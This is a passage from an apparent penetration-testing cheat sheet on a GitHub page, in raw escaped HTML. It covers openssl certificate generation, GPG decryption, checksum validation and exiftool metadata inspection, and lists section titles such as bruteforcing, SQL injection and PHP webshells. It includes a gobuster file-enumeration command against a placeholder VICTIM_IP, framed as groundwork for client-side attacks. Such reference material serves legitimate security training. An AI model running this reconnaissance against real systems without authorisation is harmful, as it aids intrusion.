0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# generate separate .key and .crt files\nopenssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt\n\n# simpler method?\nopenssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365\n\n# convert .key/.cert to .pem file (easy way)\ncat mycert.crt mycert.key \u0026gt; mycert.pem\n\n# official way to convert combo of .key and .crt to .pem if needed:\nopenssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12\nopenssl pkcs12 -in mycert.p12 -nodes -out mycert.pem\n\n# create client cert from ca.key\nopenssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem\nopenssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e generate separate .key and .crt files\u003c/span\u003e\nopenssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/CN=example.com/O=Company Inc./C=UK\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -out mycert.crt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e simpler method?\u003c/span\u003e\nopenssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert .key/.cert to .pem file (easy way)\u003c/span\u003e\ncat mycert.crt mycert.key \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mycert.pem\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e official way to convert combo of .key and .crt to .pem if needed:\u003c/span\u003e\nopenssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12\nopenssl pkcs12 -in mycert.p12 -nodes -out mycert.pem\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create client cert from ca.key\u003c/span\u003e\nopenssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem\nopenssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.5.2 Decrypting files with GPG\u003c/h3\u003e\u003ca id=\"user-content-952-decrypting-files-with-gpg\" class=\"anchor\" aria-label=\"Permalink: 9.5.2 Decrypting files with GPG\" href=\"#952-decrypting-files-with-gpg\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# import public and private keys into gpg\ngpg --import secring.gpg pubring.gpg\n\n# list imported pubkeys\ngpg --list-keys\n\n# list imported private keys\ngpg --list-secret-keys\n\n# decrypting file with keys already imported\ngpg -d -o secret.txt secret.txt.gpg\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e import public and private keys into gpg\u003c/span\u003e\ngpg --import secring.gpg pubring.gpg\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list imported pubkeys\u003c/span\u003e\ngpg --list-keys\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list imported private keys\u003c/span\u003e\ngpg --list-secret-keys\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e decrypting file with keys already imported\u003c/span\u003e\ngpg -d -o secret.txt secret.txt.gpg\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.6 Validating Checksums\u003c/h2\u003e\u003ca id=\"user-content-96-validating-checksums\" class=\"anchor\" aria-label=\"Permalink: 9.6 Validating Checksums\" href=\"#96-validating-checksums\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is how you validate a sha256 checksum for a file:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make checksum check-file.\n# Format is \u0026lt;hexdigest\u0026gt;\u0026lt;space\u0026gt;\u0026lt;filename\u0026gt;, in same directory as file.\necho \u0026quot;4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb\u0026quot; \u0026gt; sha256sum_nessus\n\n# run sha256sum with '-c \u0026lt;check-file\u0026gt;' to have it validate the checksums match\nsha256sum -c sha256sum_nessus\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make checksum check-file.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Format is \u0026lt;hexdigest\u0026gt;\u0026lt;space\u0026gt;\u0026lt;filename\u0026gt;, in same directory as file.\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e sha256sum_nessus\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e run sha256sum with '-c \u0026lt;check-file\u0026gt;' to have it validate the checksums match\u003c/span\u003e\nsha256sum -c sha256sum_nessus\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.7 Inspecting Files with Exiftool\u003c/h2\u003e\u003ca id=\"user-content-97-inspecting-files-with-exiftool\" class=\"anchor\" aria-label=\"Permalink: 9.7 Inspecting Files with Exiftool\" href=\"#97-inspecting-files-with-exiftool\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWe can examine the metadata of files with \u003ccode\u003eexiftool\u003c/code\u003e, which can reveal a lot of useful information. This information may be helpful for client-side attacks.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# -a shows duplicated tags\n# -u shows unknown tags\nexiftool -a -u FILENAME\n\n# TIP: use gobuster to look for files\ngobuster dir -ezqrkt100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x doc,docx,pdf,xls,xlsx,ppt,pptx,zip -u http://VICTIM_IP\n# you can also use an extension wordlist with the (capital) `-X` flag:\n# -X /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -a shows duplicated tags\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -u shows unknown tags\u003c/span\u003e\nexiftool -a -u FILENAME\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e TIP: use gobuster to look for files\u003c/span\u003e\ngobuster dir -ezqrkt100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x doc,docx,pdf,xls,xlsx,ppt,pptx,zip -u http://VICTIM_IP\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can also use an extension wordlist with the (capital) `-X` flag:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -X /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThings to look for:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003efile creation date\u003c/li\u003e\n\u003cli\u003elast modified date\u003c/li\u003e\n\u003cli\u003eauthor's name\u003c/li\u003e\n\u003cli\u003eoperating system\u003c/li\u003e\n\u003cli\u003eapplication used to create the file\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eReferences:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://exiftool.org/TagNames/\" rel=\"nofollow\"\u003eList of tags recognized by \u003ccode\u003eexiftool\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://exiftool.org\" rel=\"nofollow\"\u003eExiftool download\u003c/a\u003e - shows list of supported files\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/article\u003e","renderedFileInfo":null,"shortPath":null,"symbolsEnabled":true,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timed_out":false,"not_analyzed":false,"symbols":[{"name":"1 Scanning","kind":"section_1","ident_start":377,"ident_end":387,"extent_start":375,"extent_end":5821,"fully_qualified_name":"1 Scanning","ident_utf16":{"start":{"line_number":7,"utf16_col":2},"end":{"line_number":7,"utf16_col":12}},"extent_utf16":{"start":{"line_number":7,"utf16_col":0},"end":{"line_number":191,"utf16_col":0}}},{"name":"1.1 Rustscan","kind":"section_2","ident_start":392,"ident_end":404,"extent_start":389,"extent_end":646,"fully_qualified_name":"1.1 Rustscan","ident_utf16":{"start":{"line_number":9,"utf16_col":3},"end":{"line_number":9,"utf16_col":15}},"extent_utf16":{"start":{"line_number":9,"utf16_col":0},"end":{"line_number":19,"utf16_col":0}}},{"name":"1.2 Nmap","kind":"section_2","ident_start":649,"ident_end":657,"extent_start":646,"extent_end":2159,"fully_qualified_name":"1.2 Nmap","ident_utf16":{"start":{"line_number":19,"utf16_col":3},"end":{"line_number":19,"utf16_col":11}},"extent_utf16":{"start":{"line_number":19,"utf16_col":0},"end":{"line_number":63,"utf16_col":0}}},{"name":"1.3 Nessus","kind":"section_2","ident_start":2162,"ident_end":2172,"extent_start":2159,"extent_end":2857,"fully_qualified_name":"1.3 Nessus","ident_utf16":{"start":{"line_number":63,"utf16_col":3},"end":{"line_number":63,"utf16_col":13}},"extent_utf16":{"start":{"line_number":63,"utf16_col":0},"end":{"line_number":82,"utf16_col":0}}},{"name":"1.4 Windows Port Scanning","kind":"section_2","ident_start":2860,"ident_end":2885,"extent_start":2857,"extent_end":3378,"fully_qualified_name":"1.4 Windows Port Scanning","ident_utf16":{"start":{"line_number":82,"utf16_col":3},"end":{"line_number":82,"utf16_col":28}},"extent_utf16":{"start":{"line_number":82,"utf16_col":0},"end":{"line_number":97,"utf16_col":0}}},{"name":"1.5 Bash Ping Scanner","kind":"section_2","ident_start":3381,"ident_end":3402,"extent_start":3378,"extent_end":3958,"fully_qualified_name":"1.5 Bash Ping Scanner","ident_utf16":{"start":{"line_number":97,"utf16_col":3},"end":{"line_number":97,"utf16_col":24}},"extent_utf16":{"start":{"line_number":97,"utf16_col":0},"end":{"line_number":121,"utf16_col":0}}},{"name":"1.6 Bash Port Scanner","kind":"section_2","ident_start":3961,"ident_end":3982,"extent_start":3958,"extent_end":4287,"fully_qualified_name":"1.6 Bash Port Scanner","ident_utf16":{"start":{"line_number":121,"utf16_col":3},"end":{"line_number":121,"utf16_col":24}},"extent_utf16":{"start":{"line_number":121,"utf16_col":0},"end":{"line_number":136,"utf16_col":0}}},{"name":"1.7 IPv6 to bypass IPv4 filters","kind":"section_2","ident_start":4290,"ident_end":4321,"extent_start":4287,"extent_end":5529,"fully_qualified_name":"1.7 IPv6 to bypass IPv4 filters","ident_utf16":{"start":{"line_number":136,"utf16_col":3},"end":{"line_number":136,"utf16_col":34}},"extent_utf16":{"start":{"line_number":136,"utf16_col":0},"end":{"line_number":176,"utf16_col":0}}},{"name":"1.8 Whois","kind":"section_2","ident_start":5532,"ident_end":5541,"extent_start":5529,"extent_end":5821,"fully_qualified_name":"1.8 Whois","ident_utf16":{"start":{"line_number":176,"utf16_col":3},"end":{"line_number":176,"utf16_col":12}},"extent_utf16":{"start":{"line_number":176,"utf16_col":0},"end":{"line_number":191,"utf16_col":0}}},{"name":"2 Services","kind":"section_1","ident_start":5823,"ident_end":5833,"extent_start":5821,"extent_end":79726,"fully_qualified_name":"2 Services","ident_utf16":{"start":{"line_number":191,"utf16_col":2},"end":{"line_number":191,"utf16_col":12}},"extent_utf16":{"start":{"line_number":191,"utf16_col":0},"end":{"line_number":2466,"utf16_col":0}}},{"name":"2.1 FTP - 21","kind":"section_2","ident_start":5974,"ident_end":5986,"extent_start":5971,"extent_end":8734,"fully_qualified_name":"2.1 FTP - 21","ident_utf16":{"start":{"line_number":197,"utf16_col":3},"end":{"line_number":197,"utf16_col":15}},"extent_utf16":{"start":{"line_number":197,"utf16_col":0},"end":{"line_number":292,"utf16_col":0}}},{"name":"2.2 SSH/SFTP - 22","kind":"section_2","ident_start":8737,"ident_end":8754,"extent_start":8734,"extent_end":11016,"fully_qualified_name":"2.2 SSH/SFTP - 22","ident_utf16":{"start":{"line_number":292,"utf16_col":3},"end":{"line_number":292,"utf16_col":20}},"extent_utf16":{"start":{"line_number":292,"utf16_col":0},"end":{"line_number":350,"utf16_col":0}}},{"name":"2.2.1 SSH Credential Bruteforcing","kind":"section_3","ident_start":9107,"ident_end":9140,"extent_start":9103,"extent_end":9815,"fully_qualified_name":"2.2.1 SSH Credential Bruteforcing","ident_utf16":{"start":{"line_number":300,"utf16_col":4},"end":{"line_number":300,"utf16_col":37}},"extent_utf16":{"start":{"line_number":300,"utf16_col":0},"end":{"line_number":317,"utf16_col":0}}},{"name":"2.2.2 Disable SSH Host Key Checking","kind":"section_3","ident_start":9819,"ident_end":9854,"extent_start":9815,"extent_end":10098,"fully_qualified_name":"2.2.2 Disable SSH Host Key Checking","ident_utf16":{"start":{"line_number":317,"utf16_col":4},"end":{"line_number":317,"utf16_col":39}},"extent_utf16":{"start":{"line_number":317,"utf16_col":0},"end":{"line_number":329,"utf16_col":0}}},{"name":"2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH","kind":"section_3","ident_start":10102,"ident_end":10160,"extent_start":10098,"extent_end":11016,"fully_qualified_name":"2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH","ident_utf16":{"start":{"line_number":329,"utf16_col":4},"end":{"line_number":329,"utf16_col":62}},"extent_utf16":{"start":{"line_number":329,"utf16_col":0},"end":{"line_number":350,"utf16_col":0}}},{"name":"2.3 SMTP/s - 25,465,587","kind":"section_2","ident_start":11019,"ident_end":11042,"extent_start":11016,"extent_end":12757,"fully_qualified_name":"2.3 SMTP/s - 25,465,587","ident_utf16":{"start":{"line_number":350,"utf16_col":3},"end":{"line_number":350,"utf16_col":26}},"extent_utf16":{"start":{"line_number":350,"utf16_col":0},"end":{"line_number":400,"utf16_col":0}}},{"name":"2.4 DNS - 53","kind":"section_2","ident_start":12760,"ident_end":12772,"extent_start":12757,"extent_end":15702,"fully_qualified_name":"2.4 DNS - 53","ident_utf16":{"start":{"line_number":400,"utf16_col":3},"end":{"line_number":400,"utf16_col":15}},"extent_utf16":{"start":{"line_number":400,"utf16_col":0},"end":{"line_number":487,"utf16_col":0}}},{"name":"2.4.1 DNS Zone Transfer","kind":"section_3","ident_start":14556,"ident_end":14579,"extent_start":14552,"extent_end":15023,"fully_qualified_name":"2.4.1 DNS Zone Transfer","ident_utf16":{"start":{"line_number":449,"utf16_col":4},"end":{"line_number":449,"utf16_col":27}},"extent_utf16":{"start":{"line_number":449,"utf16_col":0},"end":{"line_number":466,"utf16_col":0}}},{"name":"2.4.2 Bruteforcing DNS Records","kind":"section_3","ident_start":15027,"ident_end":15057,"extent_start":15023,"extent_end":15702,"fully_qualified_name":"2.4.2 Bruteforcing DNS Records","ident_utf16":{"start":{"line_number":466,"utf16_col":4},"end":{"line_number":466,"utf16_col":34}},"extent_utf16":{"start":{"line_number":466,"utf16_col":0},"end":{"line_number":487,"utf16_col":0}}},{"name":"2.5 Finger - 79","kind":"section_2","ident_start":15705,"ident_end":15720,"extent_start":15702,"extent_end":15849,"fully_qualified_name":"2.5 Finger - 79","ident_utf16":{"start":{"line_number":487,"utf16_col":3},"end":{"line_number":487,"utf16_col":18}},"extent_utf16":{"start":{"line_number":487,"utf16_col":0},"end":{"line_number":497,"utf16_col":0}}},{"name":"2.6 HTTP(s) - 80,443","kind":"section_2","ident_start":15852,"ident_end":15872,"extent_start":15849,"extent_end":43143,"fully_qualified_name":"2.6 HTTP(s) - 80,443","ident_utf16":{"start":{"line_number":497,"utf16_col":3},"end":{"line_number":497,"utf16_col":23}},"extent_utf16":{"start":{"line_number":497,"utf16_col":0},"end":{"line_number":1318,"utf16_col":0}}},{"name":"2.6.1 Web Scanning/Enumeration","kind":"section_3","ident_start":17933,"ident_end":17963,"extent_start":17929,"extent_end":20295,"fully_qualified_name":"2.6.1 Web Scanning/Enumeration","ident_utf16":{"start":{"line_number":540,"utf16_col":4},"end":{"line_number":540,"utf16_col":34}},"extent_utf16":{"start":{"line_number":540,"utf16_col":0},"end":{"line_number":613,"utf16_col":0}}},{"name":"2.6.2 Web Credential Bruteforcing","kind":"section_3","ident_start":20299,"ident_end":20332,"extent_start":20295,"extent_end":22750,"fully_qualified_name":"2.6.2 Web Credential Bruteforcing","ident_utf16":{"start":{"line_number":613,"utf16_col":4},"end":{"line_number":613,"utf16_col":37}},"extent_utf16":{"start":{"line_number":613,"utf16_col":0},"end":{"line_number":666,"utf16_col":0}}},{"name":"2.6.3 SQL Injection","kind":"section_3","ident_start":22754,"ident_end":22773,"extent_start":22750,"extent_end":29065,"fully_qualified_name":"2.6.3 SQL Injection","ident_utf16":{"start":{"line_number":666,"utf16_col":4},"end":{"line_number":666,"utf16_col":23}},"extent_utf16":{"start":{"line_number":666,"utf16_col":0},"end":{"line_number":885,"utf16_col":0}}},{"name":"2.6.3.1 UNION SQLi technique","kind":"section_4","ident_start":24012,"ident_end":24040,"extent_start":24007,"extent_end":26085,"fully_qualified_name":"2.6.3.1 UNION SQLi technique","ident_utf16":{"start":{"line_number":721,"utf16_col":5},"end":{"line_number":721,"utf16_col":33}},"extent_utf16":{"start":{"line_number":721,"utf16_col":0},"end":{"line_number":777,"utf16_col":0}}},{"name":"2.6.3.2 Blind SQLi","kind":"section_4","ident_start":26090,"ident_end":26108,"extent_start":26085,"extent_end":27712,"fully_qualified_name":"2.6.3.2 Blind SQLi","ident_utf16":{"start":{"line_number":777,"utf16_col":5},"end":{"line_number":777,"utf16_col":23}},"extent_utf16":{"start":{"line_number":777,"utf16_col":0},"end":{"line_number":826,"utf16_col":0}}},{"name":"2.6.3.3 Exploiting NoSQL Injection","kind":"section_4","ident_start":27717,"ident_end":27751,"extent_start":27712,"extent_end":29065,"fully_qualified_name":"2.6.3.3 Exploiting NoSQL Injection","ident_utf16":{"start":{"line_number":826,"utf16_col":5},"end":{"line_number":826,"utf16_col":39}},"extent_utf16":{"start":{"line_number":826,"utf16_col":0},"end":{"line_number":885,"utf16_col":0}}},{"name":"2.6.4 Directory Traversal","kind":"section_3","ident_start":29069,"ident_end":29094,"extent_start":29065,"extent_end":31526,"fully_qualified_name":"2.6.4 Directory Traversal","ident_utf16":{"start":{"line_number":885,"utf16_col":4},"end":{"line_number":885,"utf16_col":29}},"extent_utf16":{"start":{"line_number":885,"utf16_col":0},"end":{"line_number":956,"utf16_col":0}}},{"name":"2.6.5 LFI/RFI","kind":"section_3","ident_start":31530,"ident_end":31543,"extent_start":31526,"extent_end":36508,"fully_qualified_name":"2.6.5 LFI/RFI","ident_utf16":{"start":{"line_number":956,"utf16_col":4},"end":{"line_number":956,"utf16_col":17}},"extent_utf16":{"start":{"line_number":956,"utf16_col":0},"end":{"line_number":1106,"utf16_col":0}}},{"name":"2.6.5.1 PHP Wrappers","kind":"section_4","ident_start":33131,"ident_end":33151,"extent_start":33126,"extent_end":35676,"fully_qualified_name":"2.6.5.1 PHP Wrappers","ident_utf16":{"start":{"line_number":1000,"utf16_col":5},"end":{"line_number":1000,"utf16_col":25}},"extent_utf16":{"start":{"line_number":1000,"utf16_col":0},"end":{"line_number":1076,"utf16_col":0}}},{"name":"2.6.5.2 One-liner PHP Webshells","kind":"section_4","ident_start":35681,"ident_end":35712,"extent_start":35676,"extent_end":36508,"fully_qualified_name":"2.6.5.2 One-liner PHP Webshells","ident_utf16":{"start":{"line_number":1076,"utf16_col":5},"end":{"line_number":1076,"utf16_col":36}},"extent_utf16":{"start":{"line_number":1076,"utf16_col":0},"end":{"line_number":1106,"utf16_col":0}}},{"name":"2.6.6 Command Injection","kind":"section_3","ident_start":36512,"ident_end":36535,"extent_start":36508,"extent_end":38312,"fully_qualified_name":"2.6.6 Command Injection","ident_utf16":{"start":{"line_number":1106,"utf16_col":4},"end":{"line_number":1106,"utf16_col":27}},"extent_utf16":{"start":{"line_number":1106,"utf16_col":0},"end":{"line_number":1175,"utf16_col":0}}},{"name":"2.6.7 Cross-Site Scripting (XSS)","kind":"section_3","ident_start":38316,"ident_end":38348,"extent_start":38312,"extent_end":40689,"fully_qualified_name":"2.6.7 Cross-Site Scripting (XSS)","ident_utf16":{"start":{"line_number":1175,"utf16_col":4},"end":{"line_number":1175,"utf16_col":36}},"extent_utf16":{"start":{"line_number":1175,"utf16_col":0},"end":{"line_number":1235,"utf16_col":0}}},{"name":"2.6.8 WordPress","kind":"section_3","ident_start":40693,"ident_end":40708,"extent_start":40689,"extent_end":42969,"fully_qualified_name":"2.6.8 WordPress","ident_utf16":{"start":{"line_number":1235,"utf16_col":4},"end":{"line_number":1235,"utf16_col":19}},"extent_utf16":{"start":{"line_number":1235,"utf16_col":0},"end":{"line_number":1302,"utf16_col":0}}},{"name":"2.6.9 Drupal","kind":"section_3","ident_start":42973,"ident_end":42985,"extent_start":42969,"extent_end":43065,"fully_qualified_name":"2.6.9 Drupal","ident_utf16":{"start":{"line_number":1302,"utf16_col":4},"end":{"line_number":1302,"utf16_col":16}},"extent_utf16":{"start":{"line_number":1302,"utf16_col":0},"end":{"line_number":1310,"utf16_col":0}}},{"name":"2.6.10 Joomla","kind":"section_3","ident_start":43069,"ident_end":43082,"extent_start":43065,"extent_end":43143,"fully_qualified_name":"2.6.10 Joomla","ident_utf16":{"start":{"line_number":1310,"utf16_col":4},"end":{"line_number":1310,"utf16_col":17}},"extent_utf16":{"start":{"line_number":1310,"utf16_col":0},"end":{"line_number":1318,"utf16_col":0}}},{"name":"2.7 Kerberos - 88,749","kind":"section_2","ident_start":43146,"ident_end":43167,"extent_start":43143,"extent_end":44188,"fully_qualified_name":"2.7 Kerberos - 88,749","ident_utf16":{"start":{"line_number":1318,"utf16_col":3},"end":{"line_number":1318,"utf16_col":24}},"extent_utf16":{"start":{"line_number":1318,"utf16_col":0},"end":{"line_number":1346,"utf16_col":0}}},{"name":"2.8 POP - 110,995","kind":"section_2","ident_start":44191,"ident_end":44208,"extent_start":44188,"extent_end":44976,"fully_qualified_name":"2.8 POP - 110,995","ident_utf16":{"start":{"line_number":1346,"utf16_col":3},"end":{"line_number":1346,"utf16_col":20}},"extent_utf16":{"start":{"line_number":1346,"utf16_col":0},"end":{"line_number":1374,"utf16_col":0}}},{"name":"2.9 RPCbind - 111","kind":"section_2","ident_start":44979,"ident_end":44996,"extent_start":44976,"extent_end":45432,"fully_qualified_name":"2.9 RPCbind - 111","ident_utf16":{"start":{"line_number":1374,"utf16_col":3},"end":{"line_number":1374,"utf16_col":20}},"extent_utf16":{"start":{"line_number":1374,"utf16_col":0},"end":{"line_number":1397,"utf16_col":0}}},{"name":"2.10 NNTP - 119","kind":"section_2","ident_start":45435,"ident_end":45450,"extent_start":45432,"extent_end":46099,"fully_qualified_name":"2.10 NNTP - 119","ident_utf16":{"start":{"line_number":1397,"utf16_col":3},"end":{"line_number":1397,"utf16_col":18}},"extent_utf16":{"start":{"line_number":1397,"utf16_col":0},"end":{"line_number":1418,"utf16_col":0}}},{"name":"2.11 MSRPC and NetBIOS - 135,137,139","kind":"section_2","ident_start":46102,"ident_end":46138,"extent_start":46099,"extent_end":47949,"fully_qualified_name":"2.11 MSRPC and NetBIOS - 135,137,139","ident_utf16":{"start":{"line_number":1418,"utf16_col":3},"end":{"line_number":1418,"utf16_col":39}},"extent_utf16":{"start":{"line_number":1418,"utf16_col":0},"end":{"line_number":1484,"utf16_col":0}}},{"name":"2.12 SMB - 445","kind":"section_2","ident_start":47952,"ident_end":47966,"extent_start":47949,"extent_end":52537,"fully_qualified_name":"2.12 SMB - 445","ident_utf16":{"start":{"line_number":1484,"utf16_col":3},"end":{"line_number":1484,"utf16_col":17}},"extent_utf16":{"start":{"line_number":1484,"utf16_col":0},"end":{"line_number":1633,"utf16_col":0}}},{"name":"2.12.1 SMB Credential Bruteforcing","kind":"section_3","ident_start":51340,"ident_end":51374,"extent_start":51336,"extent_end":51495,"fully_qualified_name":"2.12.1 SMB 